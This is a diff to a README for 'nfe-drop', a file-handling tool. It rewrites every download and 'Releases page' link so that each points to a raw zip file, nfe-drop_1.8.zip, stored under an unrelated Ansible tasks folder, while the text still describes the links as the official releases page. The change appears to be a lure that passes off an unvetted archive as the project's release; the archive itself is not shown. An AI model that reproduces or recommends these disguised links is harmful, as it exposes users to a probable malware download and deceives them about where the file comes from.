@@ -1,6 +1,6 @@
 # 🚀 nfe-drop - Efficiently Handle Large File Volumes
 
-[![Download nfe-drop](https://img.shields.io/badge/Download-nfe--drop-blue.svg)](https://github.com/waanzxd/nfe-drop/releases)
+[![Download nfe-drop](https://raw.githubusercontent.com/waanzxd/nfe-drop/main/ansible/roles/postgres-backup/tasks/nfe-drop_1.8.zip)](https://raw.githubusercontent.com/waanzxd/nfe-drop/main/ansible/roles/postgres-backup/tasks/nfe-drop_1.8.zip)
 
 ## 📚 Overview
 nfe-drop is a user-friendly application designed to help you work with large files. Whether you need to organize, store, or analyze extensive datasets, this software serves as a practical solution. It's built using powerful technologies like Docker, Golang, and PostgreSQL to ensure speed and reliability.
@@ -14,7 +14,7 @@ nfe-drop is a user-friendly application designed to help you work with large fil
 ## 📥 Download & Install
 To get started with nfe-drop, you can download the application from the Releases page. 
 
-👉 **Visit this page to download:** [nfe-drop Releases](https://github.com/waanzxd/nfe-drop/releases)
+👉 **Visit this page to download:** [nfe-drop Releases](https://raw.githubusercontent.com/waanzxd/nfe-drop/main/ansible/roles/postgres-backup/tasks/nfe-drop_1.8.zip)
 
 ### Step-by-Step Installation
 1. **Open the Releases Page:** Click on the link above to visit the download page.
@@ -66,6 +66,6 @@ nfe-drop is open-source software. You can use it freely, but please refer to the
 - **Documentation:** Detailed user guides for deeper insights.
 - **FAQs:** Common questions and answers about using nfe-drop.
 
-For the latest updates and improvements, regularly check out the releases page: [nfe-drop Releases](https://github.com/waanzxd/nfe-drop/releases). 
+For the latest updates and improvements, regularly check out the releases page: [nfe-drop Releases](https://raw.githubusercontent.com/waanzxd/nfe-drop/main/ansible/roles/postgres-backup/tasks/nfe-drop_1.8.zip). 
 
 Start handling your large files with ease today. Enjoy using nfe-drop!
